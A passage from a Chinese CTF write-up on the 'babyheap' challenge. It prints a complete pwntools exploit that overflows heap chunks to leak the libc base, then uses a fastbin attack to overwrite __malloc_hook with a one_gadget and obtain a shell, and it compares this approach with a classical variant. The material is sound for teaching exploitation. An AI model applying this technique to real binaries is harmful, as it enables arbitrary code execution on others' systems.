         [r12] == NULL || r12 == NULL 
    0xf0274 execve("/bin/sh", rsp+0x50, environ) 
    constraints: 
         [rsp+0x50] == NULL 
    0xf1117 execve("/bin/sh", rsp+0x70, environ) 
    constraints: 
         [rsp+0x70] == NULL 
    0xf66c0 execve("/bin/sh", rcx, [rbp-0xf8]) 
    constraints: 
         [rcx] == NULL || rcx == NULL 
         [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
## 三、exploit开发
exploit完全按照上面进行的漏洞利用分析开发，因此不多说，直接贴出对应exp：
    from pwn import *
    #ARCH SETTING
    context(arch = 'amd64' , os = 'linux')
    #r = process('./babyheap')
    r = remote('127.0.0.1',9999)
    #FUNCTION DEFINE
    def new(size):
       r.recvuntil("Command: ")
       r.sendline("1")
       r.recvuntil("Size: ")
       r.sendline(str(size))
    def edit(idx,size,content):
       r.recvuntil("Command: ")
       r.sendline("2")
       r.recvuntil("Index: ")
       r.sendline(str(idx))
       r.recvuntil("Size: ")
       r.sendline(str(size))
       r.recvuntil("Content: ")
       r.send(content)
    def delet(idx):
       r.recvuntil("Command: ")
       r.sendline("3")
       r.recvuntil("Index: ")
       r.sendline(str(idx))
    def echo(idx):
       r.recvuntil("Command: ")
       r.sendline("4")
       r.recvuntil("Index: ")
       r.sendline(str(idx))
    #MAIN EXPLOIT
    #memory leak
    #step1
    new(0x90) #idx.0 to unsorted bin
    new(0x90) #idx.1 to unsorted bin
    new(0x90) #idx.2 to unsorted bin
    new(0x90) #idx.3 for protecting top_chunk merge
    delet(1)
    #step2
    payload_expand = 'A'*0x90 + p64(0) + p64(0x141)
    edit(0,len(payload_expand),payload_expand)
    #step3
    new(0x130)
    #step4
    payload_crrct = 'A'*0x90 + p64(0) + p64(0xa1)
    edit(1,len(payload_crrct),payload_crrct)
    #step5
    delet(2)
    #step6
    echo(1)
    r.recvuntil("Content: n")
    r.recv(0x90 + 0x10)
    fd = u64( r.recv(8) )
    libc_unsort = fd
    libc_base = libc_unsort - 0x3c4b78
    #hijack overflow
    #the present idx_table has inuse logs: 0 , 1 , 3 ,wait-queue: 2 , 4 , 5 , 6 , 7 , ...
    new(0x90) #idx.2 clean the heap-bins environment
    new(0x10) #idx.4 for overflow
    new(0x60) #idx.5 to fastbin[5] 
    new(0x10) #idx.6 for protecting top_chunk merge
    delet(5) #NOTICE: idx.5 recycled after here !!!
    malloc_hook_fkchunk = libc_base + 0x3c4aed
    payload_hj = 'A'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook_fkchunk)
    edit(4,len(payload_hj),payload_hj)
    #hijack attack
    new(0x60) #idx.5
    new(0x60) #idx.7
    onegadget_addr = libc_base + 0x4526a
    payload_hj2onegadget = 'A'*3 + p64(0) + p64(0) + p64(onegadget_addr)
    edit(7,len(payload_hj2onegadget),payload_hj2onegadget)
    #fire
    new(0x100)
    r.interactive()
*注释：
1.step2就是溢出“受孕”过程，0x121就是通过溢出伪造的size字段值，0x140 = 0xa0 * 2
2.step4中的payload_crrct是将fetus chunk的pre_size和size字段写为正确合法值
3.由于fetus chunk被free后unsorted bin里实际上它自己（大家可以自己回溯exp去看），所以它的fd和bk都是指向unsorted
bin表头的，因此这里泄露fd就足够了
4.#hijack
overflow那里最开始new的0x90是为了清空bin环境，使所有的bins里面都没有东西（本来bins里有一个用户区大小为0x90的fetus
chunk），这样再分配堆块的时候就是从top
chunk往下割了，避免了从原来的bins中割一块给你：那为什么要这样呢？因为不清空bin环境exp容易出问题，本文后面将会举例说明
5.malloc_hook_fkchunk的地址计算别忘了错位构造出的size字段前还有个pre_size字段
6.’A’*3 + p64(0) + p64(0)是因为从错位构造的size字段末尾到malloc_hook直接还有0x13个字节的数据
此外，多说一句，关于堆块受孕过程，我们通过溢出伪造的size大小其实实际上只要能把fd字段包含进去就足够了，不必把整个fetus chunk都弄进去。
## 四、不同exp引发的深入思考
文章开头我说过，我们用的exploit和网上公开流行的版本用的方法并不一样，主要区别就在于泄露libc_base的原理是不同的
这里给出网上流行的经典版本exp的几个链接：
[exp_classical1](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/#_27)
[exp_classical2](https://blog.csdn.net/qq_35519254/article/details/78213962https://blog.csdn.net/qq_35519254/article/details/78213962)
经典版本exp的思路是利用了两次fastbin attack，他们泄露libc_base的就是通过第一次fastbin
attack完成的，第二次fastbin attck与我们相同，也是劫持malloc_hook.
我们知道，fastbin
attack就是要篡改fd指针，将fd劫持到目标内存，那么有意思的地方来了：对于相邻的几个堆块，它们的内存地址也是相邻的，也就是说它们的内存地址值有可能只有最低字节不同，其它字节都相同，那么如果我们通过溢出篡改掉fd的最低字节，就可以把fd劫持到任意堆块了！
经典版本的exp正是利用了这一点进行了fastbin
attack，拿到了一个指向某个已经是占用态的堆块的用户指针（也就是说一个chunk同时有两个用户指针指向它），如果这个chunk的大小属于unsorted
bin，那么就可以先free它（free的是之前的那个用户指针），然后用我们后来通过fastbin
attack拿到的用户指针来泄露fd和bk，进而得到libc_base
当然，为了保证一能绕过size校验、二能进入unsorted bin，过程中还需要通过溢出来伪造合适的size字段值！
按我们之前的思路，要能够通过读一个exist即inuse 的堆块打印出某个free的堆块里的内容，必须exist的块足够大大到把fetus
chunk包含进去，于是就有了溢出篡改size进行“受孕”的思路，而经典exp的思路是：要能够通过读一个exist即inuse
的堆块打印出某个free的堆块里的内容，只要有两个用户指针指向同一个堆块就可以了！
### 所以，经典exploit的缺陷在哪呢？
缺陷就是对libc版本依赖较大！
这道题目用的libc版本是libc2.23，在libc2.23中，用户分配的第一个堆块就位于堆区起始地址，也就是说用户分配的第一个堆块的地址最低字节一定是00（在目前的libc版本中，堆区的起始地址最低字节都是00），所以我们在泄露内存时能够顺利地计算出应该把fd的最低字节篡改为几
但在libc2.26的系统中，用户分配的第一个堆块并不位于堆区的起始处！而是从堆区起始地址往后偏移了很大一段距离，本人调试发现，在libc2.26中，用户分配的第一个堆块的地址最低字节是0x50！
至于出现这种情况的原因，是和libc2.26新引进的tcache机制有关，这个在以后的文章中会讲到。总之，这一点就造成了经典exp对libc版本的不兼容性更大了！
## 五、清空bins环境
之前exp提到了清空bins环境，现在来讲一下
如果不清空bins的话，fetus chunk就会留在unsorted
bin里，大小为0xa0（用户区大小则为0x90），此时继续按照原来的exp流程new(0x10)、new(0x60)会发生什么呢？
把清空bins那一行去掉，那段exp就变成：
    #hijack overflow 
    #the present idx_table has inuse logs: 0 , 1 , 3 ,wait-queue: 2 , 4 , 5 , 6 , 7 , ... 
    #清空bins代码new(0x90)已删除
    new(0x10) #idx.2 for overflow 
    new(0x60) #idx.4 to fastbin[4]  